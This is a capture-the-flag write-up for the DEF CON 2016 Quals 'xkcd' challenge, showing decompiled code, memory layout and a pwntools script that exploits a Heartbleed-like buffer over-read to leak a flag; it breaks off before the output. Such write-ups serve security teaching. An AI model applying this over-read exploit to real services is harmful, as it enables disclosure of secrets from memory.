# DEF CON CTF Quals 2016: xkcd

## Challenge details
| Event | Challenge | Category | Points |
|:------|:----------|:---------|-------:|
| DEF CON CTF Quals | xkcd | Baby's First | 1 |

### Description
> http://download.quals.shallweplayaga.me/be4bf26fcb93f9ab8aa193efaad31c3b/xkcd
>
> xkcd_be4bf26fcb93f9ab8aa193efaad31c3b.quals.shallweplayaga.me:1354
>
> Might want to read that comic as well... 1354

## Write-up

We are given a [binary](challenge), a service where it's running and an [xkcd comic](xkcd.com/1354) about [heartbleed](https://en.wikipedia.org/wiki/Heartbleed) which probably means this is some kind of heartbleed-inspired bug.

```bash
$ file xkcd
xkcd; ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped
```

When we decompile the binary's main routine we get the following:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax@1
  int v5; // eax@10
  __int64 v6; // rax@10
  int v7; // eax@10
  unsigned __int64 v8; // rbx@10
  unsigned __int64 v9; // rax@10
  char v10; // [sp+10h] [bp-30h]@4
  int v11; // [sp+14h] [bp-2Ch]@10
  __int64 fragment; // [sp+18h] [bp-28h]@4
  __int64 user_input; // [sp+20h] [bp-20h]@4
  __int64 v14; // [sp+28h] [bp-18h]@1

  setvbuf(stdout, 0LL, 2LL, 0LL);
  setvbuf(stdin, 0LL, 2LL, 0LL);
  bzero(&flag_buffer, 256LL);
  LODWORD(v3) = fopen64("flag", "r");
  v14 = v3;
  if ( v3 )
  {
    fread(&flag_buffer, 1LL, 256LL, v14);
    while ( 1 )
    {
      user_input = fgetln(stdin, &v10);
      fragment = strtok(user_input, "?");
      if ( strcmp_0(fragment, "SERVER, ARE YOU STILL THERE") )
        break;
      fragment = strtok(0LL, "\"");
      if ( strcmp_0(fragment, " IF SO, REPLY ") )
      {
        puts("MALFORMED REQUEST", " IF SO, REPLY ");
        exit(0xFFFFFFFFLL);
      }
      v5 = strtok(0LL, "\"");
      fragment = v5;
      LODWORD(v6) = strlen(v5);
      memcpy(globals, fragment, v6);
      fragment = strtok(0LL, "(");
      v7 = strtok(0LL, ")");
      fragment = v7;
      _isoc99_sscanf(v7);
      globals[(signed __int64)v11] = 0;
      v8 = v11;
      LODWORD(v9) = strlen(globals);
      if ( v8 > v9 )
      {
        puts("NICE TRY", "%d LETTERS");
        exit(0xFFFFFFFFLL);
      }
      puts(globals, "%d LETTERS");
    }
    puts("MALFORMED REQUEST", "SERVER, ARE YOU STILL THERE");
    exit(0xFFFFFFFFLL);
  }
  puts("Could not open the flag.", "r");
  return -1;
}
```

So the flag is read from a file to a buffer in the `.bss` segment:

```asm
.bss:00000000006B7540 flag_buffer     db    ? ;               ; DATA XREF: main+51o
.bss:00000000006B7540                                         ; main+9Ao
```

After which a line is read from stdin, split according to `?`, `"`, `(` and `)` tokens and checked whether it is of the form `SERVER, ARE YOU STILL THERE? IF SO REPLY "%s" (%d)`. If so it will write the echo string to the `globals` variable (also residing in `.bss`) after which it writes a nullbyte at offset `x` from the `globals` buffer where `x` is the integer specified between `()` in the request. It then checks whether the string length of `globals` is smaller than the offset specified and if so terminates. If not it replies by echoing the `globals` buffer. Taking a look at the layout of that buffer we see it is adjacent to the flag buffer:

```asm
.bss:00000000006B7340 ; char globals[]
.bss:00000000006B7340 globals         db ?                    ; DATA XREF: main+17Do
.bss:00000000006B7340                                         ; main+1DAw ...
.bss:00000000006B7341                 db    ? ;
(...)
.bss:00000000006B7540 flag_buffer     db    ? ;               ; DATA XREF: main+51o
.bss:00000000006B7540                                         ; main+9Ao
.bss:00000000006B7541                 db    ? ;
.bss:00000000006B7542                 db    ? ;
```

So if we manage to create a situation where `globals` and `flag_buffer` are adjacent and specify our offset to point just after the flag, we can get the binary to output the flag as part of `globals` since the only distinction between these variables is string zero-terminatedness. The distance between both addresses is `512` bytes so we specify a string of 512 bytes to fill up globals so it becomes adjacent to the flag. Then, since we don't know the flag's length, we have two options: either we work our way down from the flag length's upper bound (256 bytes as per fread parameters) until we get a response other than "NICE TRY" or we work our way up until we get "NICE TRY" knowing we've recovered the full flag. The latter approach requires less requests but will require us to reconnect for each new request (since specifying incremental offsets will overwrite the flag buffer with nullbytes). The [following script](solution/xkcd_sploit.py) takes care of this:

```python
from pwn import *

host = 'xkcd_be4bf26fcb93f9ab8aa193efaad31c3b.quals.shallweplayaga.me'
port = 1354

padding_string = 'A'*512
flag = ''

for overread_count in xrange(1, 257):
  h = remote(host, port, timeout = None)
  exploit_string = 'SERVER, ARE YOU STILL THERE? IF SO, REPLY "%s" (%d)' % (padding_string, 512 + overread_count)
  h.sendline(exploit_string)
  m = h.recvline()
  if ('NICE TRY' in m):
    break
  else:
    print m

  flag = m[512:]
  h.close()

print "[+] Flag: [%s]" % flag
```

Which gives us:

